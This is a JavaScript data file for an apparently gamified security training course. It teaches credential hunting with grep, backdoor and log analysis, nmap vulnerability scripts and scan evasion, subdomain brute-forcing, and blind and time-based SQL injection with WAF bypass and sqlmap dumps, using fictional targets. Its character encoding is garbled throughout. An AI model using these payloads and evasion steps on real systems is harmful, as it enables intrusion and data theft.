{id:â€œi1â€,title:â€œAdvanced Terminalâ€,desc:â€œRegex, find, and process managementâ€,levels:[
{id:â€œi1l1â€,title:â€œFind & Grep Powerâ€,rounds:[
{type:â€œteachâ€,text:â€œfind searches by name, size, permissions, and time. grep -r searches file contents recursively. Combine them: find / -name â€˜*.confâ€™ finds all config files. grep -ri â€˜passwordâ€™ /etc searches every file for â€˜passwordâ€™.â€},
{type:â€œtypeâ€,q:â€œFind all .log files on the system:â€,a:[â€œfind / -name â€™*.logâ€™â€,â€œfind / -name *.logâ€,â€œfind / -type f -name â€™*.logâ€™â€],why:â€œfind / searches from root, -name filters by filename pattern.â€},
{type:â€œtypeâ€,q:â€œSearch all files in /var for the word â€˜secretâ€™:â€,a:[â€œgrep -ri â€˜secretâ€™ /varâ€,â€œgrep -ri secret /varâ€,â€œgrep -r â€˜secretâ€™ /varâ€],why:â€-r = recursive, -i = case insensitive.â€},
{type:â€œhackâ€,story:â€œYouâ€™ve gained shell access to a NovaTech backup server. Somewhere in the filesystem is a file containing database credentials.â€,q:â€œFind files containing â€˜db_passwordâ€™.â€,a:[â€œgrep -ri â€˜db_passwordâ€™ /â€,â€œgrep -ri db_password /etcâ€,â€œfind / -exec grep -l â€˜db_passwordâ€™ {} +â€],output:â€./etc/app/config.yml: db_password: Tr0ub4dor&3\n./var/backups/old_config.bak: db_password: Summer2024!â€,success:â€œTwo config files with DB credentials! The backup has an older password too.â€,why:â€œgrep -ri searches all files recursively. Attackers hunt for credentials in config files.â€}
]},
{id:â€œi1l2â€,title:â€œProcess & Job Controlâ€,rounds:[
{type:â€œteachâ€,text:â€œps aux shows all running processes. kill stops a process by PID. bg/fg move jobs between background and foreground. top shows live resource usage. netstat -tlnp shows which processes are listening on which ports.â€},
{type:â€œtypeâ€,q:â€œShow all running processes:â€,a:[â€œps auxâ€,â€œps -efâ€,â€œps -auxâ€],why:â€œps aux lists every process with user, PID, CPU, and command.â€},
{type:â€œtypeâ€,q:â€œShow which processes are listening on network ports:â€,a:[â€œnetstat -tlnpâ€,â€œss -tlnpâ€,â€œnetstat -tulnpâ€],why:â€œThis reveals services running on the machine and what ports they use.â€},
{type:â€œhackâ€,story:â€œYouâ€™re on a compromised CyberVault server. Something suspicious is running \u2014 find it.â€,q:â€œList all processes and look for suspicious ones.â€,a:[â€œps auxâ€,â€œps -efâ€],output:â€œroot     1     0.0  init\nroot   445   0.0  /usr/sbin/sshd\nwww    812   0.2  /usr/sbin/apache2\nroot  1337   8.5  /tmp/.hidden/backdoor.elf\nroot  1340   0.1  nc -lvp 4444â€,success:â€œPID 1337 is a backdoor running from /tmp! And netcat is listening on 4444.â€,why:â€œAttackers hide malware in /tmp with suspicious names. High CPU + hidden paths = red flag.â€}
]},
{id:â€œi1l3â€,title:â€œBash One-Linersâ€,rounds:[
{type:â€œteachâ€,text:â€œChain commands with pipes for powerful one-liners. cut -d: -f1 /etc/passwd extracts just usernames. sort | uniq -c counts occurrences. awk prints specific columns. xargs passes output as arguments to another command.â€},
{type:â€œbuildâ€,q:â€œBuild a command to extract usernames from /etc/passwd:â€,parts:[â€œcutâ€,â€-d:â€,â€-f1â€,â€/etc/passwdâ€],answer:[â€œcutâ€,â€-d:â€,â€-f1â€,â€/etc/passwdâ€],why:â€œcut splits by delimiter (:) and takes field 1 (username).â€},
{type:â€œtypeâ€,q:â€œCount unique IP addresses in access.log:â€,a:[â€œcat access.log | cut -dâ€™ â€™ -f1 | sort | uniq -c | sort -rnâ€,â€œawk â€˜{print $1}â€™ access.log | sort | uniq -c | sort -rnâ€],why:â€œExtract IPs, sort, count unique ones, sort by count descending.â€}
]},
{id:â€œi1labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Hunt the Backdoorâ€,rounds:[
{type:â€œlabâ€,title:â€œHunt the Backdoorâ€,objective:â€œFind and analyze a hidden backdoor on a compromised server.â€,banner:â€œConnected to compromised-hostâ€¦\n$ whoami\nwww-data\nâ€,steps:[
{hint:â€œList all running processes.â€,accept:[â€œps auxâ€,â€œps -efâ€,â€œ~psâ€],output:â€œroot     1     0.0  init\nroot   445   0.0  sshd\nwww    812   0.2  apache2\nroot  1337   8.5  /tmp/.x/rat\nroot  1340   0.1  nc -lvp 9001â€,successMsg:â€œSuspicious: PID 1337 running from /tmp/.x/ with high CPU.â€,example:â€œps auxâ€,quickCmds:[â€œps auxâ€]},
{hint:â€œCheck whatâ€™s listening on ports.â€,accept:[â€œnetstat -tlnpâ€,â€œss -tlnpâ€,â€œ~netstatâ€,â€œ~ss -tâ€],output:â€œtcp  0.0.0.0:22    LISTEN  445/sshd\ntcp  0.0.0.0:80    LISTEN  812/apache2\ntcp  0.0.0.0:9001  LISTEN  1340/ncâ€,successMsg:â€œPort 9001 is a netcat listener \u2014 an open backdoor!â€,example:â€œnetstat -tlnpâ€,quickCmds:[â€œnetstat -tlnpâ€]},
{hint:â€œLook at the suspicious file in /tmp.â€,accept:[â€œ~ls /tmpâ€,â€œ~cat /tmpâ€,â€œ~file /tmpâ€,â€œls -la /tmp/.x/â€],output:â€-rwxr-xr-x 1 root root 45K /tmp/.x/rat\n-rw-râ€“râ€“ 1 root root  89 /tmp/.x/cron.shâ€,successMsg:â€œA binary and a cron script. The backdoor auto-restarts itself!â€,example:â€œls -la /tmp/.x/â€,quickCmds:[â€œls -la /tmp/.x/â€]},
{hint:â€œRead the cron script to see how it persists.â€,accept:[â€œcat /tmp/.x/cron.shâ€,â€œ~cat.*cronâ€],output:â€#!/bin/bash\nwhile true; do\n  if ! pgrep -f rat; then\n    /tmp/.x/rat &\n  fi\n  sleep 60\ndoneâ€,successMsg:â€œIt checks every 60 seconds if the backdoor is running and restarts it if killed.â€,example:â€œcat /tmp/.x/cron.shâ€,quickCmds:[â€œcat /tmp/.x/cron.shâ€]}
]}
]},
{id:â€œi1lab2â€,title:â€\uD83D\uDDA5\uFE0F Lab: Log Analysisâ€,rounds:[
{type:â€œlabâ€,title:â€œLog Analysisâ€,objective:â€œAnalyze web server logs to find an attackerâ€™s IP and method.â€,banner:â€œIncident Response Team\nAnalyzing /var/log/apache2/access.log\nâ€,steps:[
{hint:â€œCount requests per IP to find the top attacker.â€,accept:[â€œ~awk.*sortâ€,â€œ~cut.*sortâ€,â€œawk â€˜{print $1}â€™ /var/log/apache2/access.log | sort | uniq -c | sort -rnâ€],output:â€  4521  192.168.1.105\n    89  10.0.0.1\n    34  172.16.0.5\n    12  192.168.1.1â€,successMsg:â€œ192.168.1.105 made 4,521 requests \u2014 way more than anyone else.â€,example:â€œawk â€˜{print $1}â€™ access.log | sort | uniq -c | sort -rnâ€,quickCmds:[â€œawk â€˜{print $1}â€™ access.log | sort | uniq -c | sort -rnâ€]},
{hint:â€œFilter logs for the suspicious IP to see what they did.â€,accept:[â€œ~grep 192.168.1.105â€,â€œgrep â€˜192.168.1.105â€™ /var/log/apache2/access.logâ€],output:â€œ192.168.1.105 - GET /admin HTTP/1.1 403\n192.168.1.105 - GET /admin/login HTTP/1.1 200\n192.168.1.105 - POST /admin/login HTTP/1.1 401 (x4500)\n192.168.1.105 - POST /admin/login HTTP/1.1 200â€,successMsg:â€œ4,500 failed login attempts then a success \u2014 brute force attack!â€,example:â€œgrep â€˜192.168.1.105â€™ access.logâ€,quickCmds:[â€œgrep â€˜192.168.1.105â€™ access.logâ€]},
{hint:â€œSearch for what they did after logging in.â€,accept:[â€œ~grep.*192.168.1.105.*200â€,â€œgrep â€˜192.168.1.105â€™ /var/log/apache2/access.log | grep 200â€],output:â€œ192.168.1.105 - POST /admin/login 200\n192.168.1.105 - GET /admin/users 200\n192.168.1.105 - GET /admin/export?table=users 200\n192.168.1.105 - POST /admin/upload 200â€,successMsg:â€œThey exported the users table and uploaded something. Full breach.â€,example:â€œgrep â€˜192.168.1.105â€™ access.log | grep 200â€,quickCmds:[â€œgrep â€˜192.168.1.105â€™ access.log | grep 200â€]}
]}
]},
{id:â€œi1mâ€,title:â€\uD83C\uDFC6 Terminal II Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œFind all .conf files on the system:â€,a:[â€œfind / -name â€™*.confâ€™â€,â€œfind / -type f -name â€™*.confâ€™â€],why:â€œfind with -name searches by filename pattern.â€},
{type:â€œtypeâ€,q:â€œSearch /etc recursively for â€˜passwordâ€™:â€,a:[â€œgrep -ri â€˜passwordâ€™ /etcâ€,â€œgrep -ri password /etcâ€,â€œgrep -r â€˜passwordâ€™ /etcâ€],why:â€-r recursive, -i case insensitive.â€},
{type:â€œpickâ€,q:â€œA process using 8% CPU running from /tmp/.hidden/ is likely:â€,opts:[â€œMalware or a backdoorâ€,â€œA normal system serviceâ€,â€œA log rotation scriptâ€,â€œA cron jobâ€],a:â€œMalware or a backdoorâ€,why:â€œLegitimate services donâ€™t run from hidden dirs in /tmp with high CPU.â€},
{type:â€œtypeâ€,q:â€œShow processes listening on network ports:â€,a:[â€œnetstat -tlnpâ€,â€œss -tlnpâ€,â€œnetstat -tulnpâ€],why:â€œShows which services are accessible over the network.â€},
{type:â€œbuildâ€,q:â€œExtract usernames from /etc/passwd:â€,parts:[â€œcutâ€,â€-d:â€,â€-f1â€,â€/etc/passwdâ€],answer:[â€œcutâ€,â€-d:â€,â€-f1â€,â€/etc/passwdâ€],why:â€œSplits by colon delimiter, takes first field.â€}
]}
]}
]};

var SEC6 = {
id:â€œs6â€,title:â€œNetworking & Scanning IIâ€,tier:â€œintermediateâ€,icon:â€\uD83D\uDD0Dâ€,color:â€œvar(â€“blue)â€,
units:[
{id:â€œi2â€,title:â€œAdvanced Nmapâ€,desc:â€œScripts, evasion, and output masteryâ€,levels:[
{id:â€œi2l1â€,title:â€œNSE Scriptsâ€,rounds:[
{type:â€œteachâ€,text:â€œNmap Scripting Engine (NSE) runs automated checks. â€“script vuln scans for known vulnerabilities. â€“script http-enum finds web directories. â€“script smb-vuln* checks for SMB exploits like EternalBlue.â€},
{type:â€œtypeâ€,q:â€œRun vulnerability scripts against a target:â€,a:[â€œnmap â€“script vuln 10.10.10.5â€,â€œnmap â€“script=vuln 10.10.10.5â€,â€œnmap -sV â€“script vuln 10.10.10.5â€],why:â€â€“script vuln runs all vulnerability detection scripts.â€},
{type:â€œhackâ€,story:â€œMegaCorpâ€™s file server (10.10.10.20) might be running an outdated SMB version vulnerable to EternalBlue.â€,q:â€œScan for SMB vulnerabilities.â€,a:[â€œnmap â€“script smb-vuln* 10.10.10.20â€,â€œnmap â€“script smb-vuln-ms17-010 10.10.10.20â€,â€œnmap -p445 â€“script smb-vuln* 10.10.10.20â€],output:â€œPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution (EternalBlue)\n|     Risk: HIGH\n|     CVE: CVE-2017-0144â€,success:â€œConfirmed: vulnerable to EternalBlue. This is a critical finding.â€,why:â€œNSE scripts automate vulnerability checks that would take hours manually.â€}
]},
{id:â€œi2l2â€,title:â€œScan Evasionâ€,rounds:[
{type:â€œteachâ€,text:â€œFirewalls and IDS can block scans. Evasion techniques: -f fragments packets, â€“data-length adds random bytes, -D uses decoys, â€“source-port spoofs the source port. Timing: -T2 is slow and stealthy.â€},
{type:â€œbuildâ€,q:â€œBuild a stealthy scan with decoys and fragmentation:â€,parts:[â€œnmapâ€,â€-sSâ€,â€-fâ€,â€-Dâ€,â€œRND:5â€,â€œ10.10.10.5â€],answer:[â€œnmapâ€,â€-sSâ€,â€-fâ€,â€-Dâ€,â€œRND:5â€,â€œ10.10.10.5â€],why:â€-sS SYN scan, -f fragments, -D RND:5 adds 5 random decoy IPs.â€},
{type:â€œpickâ€,q:â€œWhich timing option is stealthiest?â€,opts:[â€-T0 (paranoid)â€,â€-T3 (normal)â€,â€-T4 (aggressive)â€,â€-T5 (insane)â€],a:â€-T0 (paranoid)â€,why:â€-T0 waits 5 minutes between probes. Extremely slow but nearly undetectable.â€},
{type:â€œscenarioâ€,situation:â€œYouâ€™re scanning a target with a strict firewall. Your initial scan returned all ports filtered.â€,q:â€œBest approach to get through?â€,opts:[â€œUse -Pn to skip host discovery and try different scan typesâ€,â€œScan faster with -T5â€,â€œGive up, the firewall is too strongâ€,â€œOnly scan port 80â€],a:â€œUse -Pn to skip host discovery and try different scan typesâ€,why:â€-Pn skips ping (which may be blocked). Try ACK scan (-sA), window scan, or different source ports.â€}
]},
{id:â€œi2l3â€,title:â€œOutput & Automationâ€,rounds:[
{type:â€œteachâ€,text:â€œSave scan results: -oN normal text, -oX XML (for tools), -oG grepable, -oA all formats. Combine with grep to filter: grep â€˜openâ€™ scan.txt. Import XML into Metasploit with db_import.â€},
{type:â€œtypeâ€,q:â€œSave scan results in all formats:â€,a:[â€œnmap -oA scan_results 10.10.10.5â€,â€œnmap -oA results 10.10.10.5â€],why:â€-oA creates .nmap, .xml, and .gnmap files simultaneously.â€},
{type:â€œtypeâ€,q:â€œFilter scan output for open ports only:â€,a:[â€œgrep â€˜openâ€™ scan.nmapâ€,â€œgrep open scan.nmapâ€,â€œcat scan.nmap | grep openâ€],why:â€œQuick way to extract just the open ports from verbose output.â€}
]},
{id:â€œi2labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Full Network Auditâ€,rounds:[
{type:â€œlabâ€,title:â€œFull Network Auditâ€,objective:â€œMap a corporate network, find services, and identify vulnerabilities.â€,banner:â€œPenTest Engagement: QuantumSoft Corp\nScope: 10.10.10.0/24\nRules: Full internal audit authorized.\nâ€,steps:[
{hint:â€œStart with a ping sweep to find live hosts.â€,accept:[â€œnmap -sn 10.10.10.0/24â€,â€œ~nmap -snâ€,â€œ~ping sweepâ€],output:â€œNmap scan: 256 IPs\nHost: 10.10.10.1  (gateway)\nHost: 10.10.10.20 (file-server)\nHost: 10.10.10.44 (web-server)\nHost: 10.10.10.88 (db-server)\n4 hosts upâ€,successMsg:â€œ4 live hosts found on the network.â€,example:â€œnmap -sn 10.10.10.0/24â€,quickCmds:[â€œnmap -sn 10.10.10.0/24â€]},
{hint:â€œRun a detailed scan on the web server with version detection.â€,accept:[â€œnmap -sV -sC 10.10.10.44â€,â€œ~nmap.*-sV.*10.10.10.44â€,â€œnmap -A 10.10.10.44â€],output:â€œPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.4\n80/tcp  open  http     Apache 2.4.6\n443/tcp open  https    Apache 2.4.6\n3306/tcp open mysql    MySQL 5.7.12â€,successMsg:â€œWeb server is running Apache, SSH, and MySQL is exposed!â€,example:â€œnmap -sV -sC 10.10.10.44â€,quickCmds:[â€œnmap -sV -sC 10.10.10.44â€]},
{hint:â€œCheck the file server for SMB vulnerabilities.â€,accept:[â€œnmap â€“script smb-vuln* 10.10.10.20â€,â€œ~nmap.*script.*smb.*10.10.10.20â€],output:â€œPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\n| smb-vuln-ms17-010:\n|   VULNERABLE: Remote Code Execution\n|   Risk factor: HIGHâ€,successMsg:â€œFile server is vulnerable to EternalBlue. Critical finding!â€,example:â€œnmap â€“script smb-vuln* 10.10.10.20â€,quickCmds:[â€œnmap â€“script smb-vuln* 10.10.10.20â€]},
{hint:â€œSave all results to file for your report.â€,accept:[â€œnmap -oA audit 10.10.10.0/24â€,â€œ~nmap -oAâ€,â€~-oAâ€],output:â€œResults saved:\n  audit.nmap (text)\n  audit.xml  (XML)\n  audit.gnmap (grepable)â€,successMsg:â€œAll three formats saved. XML can be imported into Metasploit.â€,example:â€œnmap -oA audit 10.10.10.0/24â€,quickCmds:[â€œnmap -oA audit 10.10.10.0/24â€]}
]}
]},
{id:â€œi2mâ€,title:â€\uD83C\uDFC6 Scanning II Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œRun all vulnerability scripts against a target:â€,a:[â€œnmap â€“script vuln 10.10.10.5â€,â€œnmap â€“script=vuln 10.10.10.5â€],why:â€â€“script vuln is the fastest way to check for known vulns.â€},
{type:â€œpickâ€,q:â€œWhat does -f do in nmap?â€,opts:[â€œFragments packets to evade firewallsâ€,â€œForces a full connect scanâ€,â€œFilters output to open portsâ€,â€œFinds hidden servicesâ€],a:â€œFragments packets to evade firewallsâ€,why:â€œFragmentation splits packets so IDS/firewall canâ€™t reassemble them easily.â€},
{type:â€œbuildâ€,q:â€œBuild a stealthy scan with fragmentation and decoys:â€,parts:[â€œnmapâ€,â€-sSâ€,â€-fâ€,â€-Dâ€,â€œRND:5â€,â€œtargetâ€],answer:[â€œnmapâ€,â€-sSâ€,â€-fâ€,â€-Dâ€,â€œRND:5â€,â€œtargetâ€],why:â€œCombines SYN scan, fragmentation, and 5 random decoy IPs.â€},
{type:â€œtypeâ€,q:â€œSave results in all formats:â€,a:[â€œnmap -oA results targetâ€,â€œnmap -oA scan targetâ€],why:â€-oA creates text, XML, and grepable output simultaneously.â€}
]}
]},
{id:â€œi3â€,title:â€œAdvanced Web Reconâ€,desc:â€œDeep enumeration and API testingâ€,levels:[
{id:â€œi3l1â€,title:â€œSubdomain & Vhost Brute-Forceâ€,rounds:[
{type:â€œteachâ€,text:â€œSome subdomains donâ€™t show in DNS. ffuf brute-forces virtual hosts by fuzzing the Host header. ffuf -u http://target -H â€˜Host: FUZZ.target.comâ€™ -w wordlist. Filter by response size to find real ones.â€},
{type:â€œtypeâ€,q:â€œBrute-force subdomains with ffuf:â€,a:[â€œffuf -u http://target.com -H â€˜Host: FUZZ.target.comâ€™ -w wordlist.txtâ€,â€œffuf -w wordlist.txt -u http://target.com -H â€˜Host: FUZZ.target.comâ€™â€],why:â€œffuf replaces FUZZ with each word. Different response size = real subdomain.â€},
{type:â€œhackâ€,story:â€œNovaTechâ€™s main site is at novatech.com, but there could be hidden internal apps on subdomains.â€,q:â€œBrute-force virtual hosts on novatech.com.â€,a:[â€œffuf -u http://novatech.com -H â€˜Host: FUZZ.novatech.comâ€™ -w wordlist.txtâ€,â€œgobuster vhost -u http://novatech.com -w wordlist.txtâ€],output:â€œadmin.novatech.com    [Status: 200, Size: 4521]\nstaging.novatech.com  [Status: 200, Size: 8834]\njenkins.novatech.com  [Status: 403, Size: 274]\napi-dev.novatech.com  [Status: 200, Size: 156]â€,success:â€œHidden subdomains! staging and api-dev are likely less secure than production.â€,why:â€œStaging and dev environments often have weaker security than production.â€}
]},
{id:â€œi3l2â€,title:â€œAPI Enumerationâ€,rounds:[
{type:â€œteachâ€,text:â€œAPIs often expose sensitive data. Check /api, /api/v1, /swagger, /docs for documentation. Test endpoints with curl. Look for authentication bypass: try accessing endpoints without tokens.â€},
{type:â€œtypeâ€,q:â€œFetch an API endpoint with curl:â€,a:[â€œcurl http://target.com/api/v1/usersâ€,â€œcurl -s http://target.com/api/usersâ€,â€œcurl http://target.com/api/usersâ€],why:â€œcurl makes HTTP requests. APIs return JSON data.â€},
{type:â€œscenarioâ€,situation:â€œYou found /api/v1/users on a target. Without authentication, it returns a 200 OK with a list of all user accounts and emails.â€,q:â€œWhat type of vulnerability is this?â€,opts:[â€œBroken Access Control / IDORâ€,â€œSQL Injectionâ€,â€œXSSâ€,â€œCSRFâ€],a:â€œBroken Access Control / IDORâ€,why:â€œThe API doesnâ€™t check authentication. Anyone can access user data.â€}
]},
{id:â€œi3l3â€,title:â€œTechnology Fingerprintingâ€,rounds:[
{type:â€œteachâ€,text:â€œIdentify what a site runs: Wappalyzer browser extension, whatweb command, HTTP headers (X-Powered-By, Server). Check /robots.txt, sitemap.xml, and source code comments for version info.â€},
{type:â€œtypeâ€,q:â€œFingerprint a websiteâ€™s technology:â€,a:[â€œwhatweb http://target.comâ€,â€œwhatweb target.comâ€],why:â€œwhatweb detects CMS, frameworks, server software, and versions.â€},
{type:â€œhackâ€,story:â€œBefore attacking MegaCorpâ€™s new web portal, identify what technologies it uses.â€,q:â€œRun whatweb to fingerprint the site.â€,a:[â€œwhatweb http://megacorp.comâ€,â€œwhatweb megacorp.comâ€,â€œ~whatwebâ€],output:â€œhttp://megacorp.com [200 OK]\n  WordPress 5.8.1\n  PHP 7.4.3\n  Apache 2.4.41\n  jQuery 3.5.1\n  Bootstrap 4.6â€,success:â€œWordPress 5.8.1 is outdated \u2014 there are known CVEs. PHP 7.4 is also EOL.â€,why:â€œKnowing exact versions lets you search for specific exploits.â€}
]},
{id:â€œi3labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Full Web Reconâ€,rounds:[
{type:â€œlabâ€,title:â€œFull Web Reconâ€,objective:â€œMap every attack surface on a target website before exploitation.â€,banner:â€œTarget: shop.novatech.com\nAuthorized penetration test.\nâ€,steps:[
{hint:â€œFingerprint the website technology.â€,accept:[â€œwhatweb http://shop.novatech.comâ€,â€œwhatweb shop.novatech.comâ€,â€œ~whatwebâ€],output:â€œWordPress 5.8.1, PHP 7.4, Apache 2.4.41\nPlugins: WooCommerce 5.5, Contact Form 7â€,successMsg:â€œWordPress + WooCommerce. Both have known vulnerabilities.â€,example:â€œwhatweb http://shop.novatech.comâ€,quickCmds:[â€œwhatweb shop.novatech.comâ€]},
{hint:â€œScan for hidden directories.â€,accept:[â€œgobuster dir -u http://shop.novatech.com -w common.txtâ€,â€œ~gobusterâ€,â€œ~dirsearchâ€],output:â€/wp-admin/     (403)\n/wp-content/   (200)\n/wp-includes/  (200)\n/backup/       (200)\n/api/          (200)\n/.env          (200)â€,successMsg:â€/backup/ and /.env are exposed! Major findings.â€,example:â€œgobuster dir -u http://shop.novatech.com -w common.txtâ€,quickCmds:[â€œgobuster dir -u http://shop.novatech.com -w common.txtâ€]},
{hint:â€œCheck the exposed .env file.â€,accept:[â€œcurl http://shop.novatech.com/.envâ€,â€œ~curl.*.envâ€],output:â€œDB_HOST=localhost\nDB_USER=root\nDB_PASS=N0v4T3ch_2024!\nAPI_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dcâ€,successMsg:â€œDatabase credentials and a live API key exposed in the .env file!â€,example:â€œcurl http://shop.novatech.com/.envâ€,quickCmds:[â€œcurl shop.novatech.com/.envâ€]},
{hint:â€œCheck for hidden API endpoints.â€,accept:[â€œcurl http://shop.novatech.com/api/v1/usersâ€,â€œ~curl.*apiâ€,â€œ~curl.*/apiâ€],output:â€[{"id":1,"name":"admin","email":"admin@novatech.com","role":"admin"},\n {"id":2,"name":"jsmith","email":"j.smith@novatech.com","role":"user"}]â€,successMsg:â€œUnauthenticated API access \u2014 leaking all user data!â€,example:â€œcurl shop.novatech.com/api/v1/usersâ€,quickCmds:[â€œcurl shop.novatech.com/api/v1/usersâ€]}
]}
]},
{id:â€œi3mâ€,title:â€\uD83C\uDFC6 Web Recon II Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œBrute-force virtual hosts:â€,a:[â€œffuf -u http://target -H â€˜Host: FUZZ.target.comâ€™ -w wordlist.txtâ€,â€œgobuster vhost -u http://target -w wordlist.txtâ€],why:â€œFuzzing the Host header discovers hidden subdomains.â€},
{type:â€œpickâ€,q:â€œAn exposed .env file typically contains:â€,opts:[â€œDatabase credentials and API keysâ€,â€œHTML templatesâ€,â€œCSS stylesheetsâ€,â€œJavaScript librariesâ€],a:â€œDatabase credentials and API keysâ€,why:â€.env files store secrets that should never be publicly accessible.â€},
{type:â€œtypeâ€,q:â€œFingerprint a website:â€,a:[â€œwhatweb http://target.comâ€,â€œwhatweb target.comâ€],why:â€œReveals CMS, framework versions, and server software.â€},
{type:â€œscenarioâ€,situation:â€œYou found /api/v1/users returns all accounts without authentication.â€,q:â€œSeverity level?â€,opts:[â€œCritical \u2014 broken access controlâ€,â€œLow \u2014 information disclosureâ€,â€œMedium \u2014 needs more testingâ€,â€œNot a vulnerabilityâ€],a:â€œCritical \u2014 broken access controlâ€,why:â€œUnauthenticated access to all user data is a critical access control failure.â€}
]}
]}
]};

var SEC7 = {
id:â€œs7â€,title:â€œWeb Exploitation IIâ€,tier:â€œintermediateâ€,icon:â€\u26A1â€,color:â€œvar(â€“red)â€,
units:[
{id:â€œi4â€,title:â€œAdvanced SQLiâ€,desc:â€œBlind injection and filter bypassâ€,levels:[
{id:â€œi4l1â€,title:â€œBlind SQL Injectionâ€,rounds:[
{type:â€œteachâ€,text:â€œBlind SQLi: the page doesnâ€™t show data, but changes behavior. Boolean-based: â€™ AND 1=1â€“ returns normal page, â€™ AND 1=2â€“ returns different. Time-based: â€™ AND SLEEP(5)â€“ makes the page take 5 seconds. If it delays, itâ€™s vulnerable.â€},
{type:â€œpickâ€,q:â€œHow does time-based blind SQLi confirm vulnerability?â€,opts:[â€œThe page response is delayedâ€,â€œThe page shows an errorâ€,â€œThe page returns extra dataâ€,â€œThe page crashesâ€],a:â€œThe page response is delayedâ€,why:â€œSLEEP(5) makes the database wait. If the response takes 5+ seconds, itâ€™s injectable.â€},
{type:â€œhackâ€,story:â€œQuantumSoftâ€™s login form doesnâ€™t show SQL errors. You suspect blind injection.â€,q:â€œTest for time-based blind SQLi.â€,a:[â€â€™ AND SLEEP(5)â€“â€,â€â€™ OR SLEEP(5)â€“â€,â€œadminâ€™ AND SLEEP(5)â€“â€],output:â€[Request sentâ€¦ waitingâ€¦]\n[Response received after 5.02 seconds]\n\nLogin failed.â€,success:â€œ5-second delay confirms time-based blind SQLi. The database executed SLEEP().â€,why:â€œEven without visible errors, timing differences prove injection exists.â€}
]},
{id:â€œi4l2â€,title:â€œSQLi Filter Bypassâ€,rounds:[
{type:â€œteachâ€,text:â€œWAFs block common SQLi. Bypass techniques: use /**/comments (SEL/**/ECT), double encoding (%2527), case mixing (SeLeCt), CHAR() function for strings. Always try multiple bypass methods.â€},
{type:â€œpickâ€,q:â€œIf a WAF blocks SELECT, which bypass might work?â€,opts:[â€œSEL/**/ECT (comment injection)â€,â€œDELETEâ€,â€œFETCHâ€,â€œRETRIEVEâ€],a:â€œSEL/**/ECT (comment injection)â€,why:â€œSQL ignores inline comments. SEL/**/ECT becomes SELECT to the database.â€},
{type:â€œscenarioâ€,situation:â€œYour SQLi payload â€™ OR 1=1â€“ gets blocked by a WAF. The error says â€˜Forbidden: malicious input detected.â€™â€,q:â€œNext move?â€,opts:[â€œTry alternate encodings and comment-based bypassâ€,â€œGive up on SQLiâ€,â€œUse the same payload againâ€,â€œTry XSS insteadâ€],a:â€œTry alternate encodings and comment-based bypassâ€,why:â€œWAFs pattern-match known payloads. Encoding and comments can evade detection.â€}
]},
{id:â€œi4l3â€,title:â€œDatabase Enumerationâ€,rounds:[
{type:â€œteachâ€,text:â€œAfter confirming SQLi, extract data systematically. information_schema.tables lists all tables. information_schema.columns lists columns. GROUP_CONCAT combines multiple rows into one output.â€},
{type:â€œtypeâ€,q:â€œList all tables in the database via UNION:â€,a:[â€â€™ UNION SELECT table_name FROM information_schema.tablesâ€“â€,â€â€™ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tablesâ€“â€],why:â€œinformation_schema contains metadata about every table and column.â€},
{type:â€œhackâ€,story:â€œYouâ€™ve confirmed UNION SQLi on MegaCorpâ€™s portal. Now extract the database structure.â€,q:â€œList all tables using UNION injection.â€,a:[â€â€™ UNION SELECT table_name FROM information_schema.tablesâ€“â€,â€â€™ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tablesâ€“â€],output:â€œusers\ncredit_cards\norders\nsessions\nadmin_logs\napi_keysâ€,success:â€œFound credit_cards and api_keys tables. High-value targets.â€,why:â€œSystematic enumeration reveals the full database structure for targeted extraction.â€}
]},
{id:â€œi4labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Blind SQLi Attackâ€,rounds:[
{type:â€œlabâ€,title:â€œBlind SQLi Attackâ€,objective:â€œExploit blind SQL injection on a login form to extract the admin password.â€,banner:â€œTarget: login.quantumsoft.io\nThe login form shows no errors.\nâ€,steps:[
{hint:â€œTest for boolean-based blind SQLi.â€,accept:[â€œ~AND 1=1â€,â€~â€™ AND 1=1â€“â€,â€â€™ AND 1=1â€“â€],output:â€œPayload: adminâ€™ AND 1=1â€“\nResponse: â€˜Invalid passwordâ€™ (normal error)\n\nPayload: adminâ€™ AND 1=2â€“\nResponse: â€˜Unknown userâ€™ (different error!)â€,successMsg:â€œDifferent responses confirm boolean-based blind SQLi!â€,example:â€â€™ AND 1=1â€“â€,quickCmds:[â€â€™ AND 1=1â€“â€,â€â€™ AND 1=2â€“â€]},
{hint:â€œConfirm with time-based test.â€,accept:[â€œ~SLEEPâ€,â€œ~sleepâ€,â€â€™ AND SLEEP(5)â€“â€],output:â€œPayload: adminâ€™ AND SLEEP(5)â€“\n[5.1 second delay]\n\nTime-based confirmed!â€,successMsg:â€œBoth boolean and time-based blind SQLi confirmed.â€,example:â€â€™ AND SLEEP(5)â€“â€,quickCmds:[â€â€™ AND SLEEP(5)â€“â€]},
{hint:â€œUse sqlmap to automate extraction.â€,accept:[â€œsqlmap -u http://login.quantumsoft.io â€“forms â€“dumpâ€,â€œ~sqlmapâ€,â€œsqlmap -u http://login.quantumsoft.io â€“formsâ€],output:â€œsqlmap identified: MySQL 5.7\n[*] Extracting tablesâ€¦\n  users (5 entries)\n  admin_config (1 entry)\n\nTable: users\n+â€“â€“+â€“â€“â€“â€“+â€”â€”â€”â€”â€”â€”+\n| id | user   | password         |\n+â€“â€“+â€“â€“â€“â€“+â€”â€”â€”â€”â€”â€”+\n| 1  | admin  | Qu4ntum_Adm1n!   |\n| 2  | jdoe   | Welcome123       |\n+â€“â€“+â€“â€“â€“â€“+â€”â€”â€”â€”â€”â€”+â€,successMsg:â€œFull database dump! Admin password extracted.â€,example:â€œsqlmap -u http://login.quantumsoft.io â€“forms â€“dumpâ€,quickCmds:[â€œsqlmap -u target â€“forms â€“dumpâ€]}
]}
]},
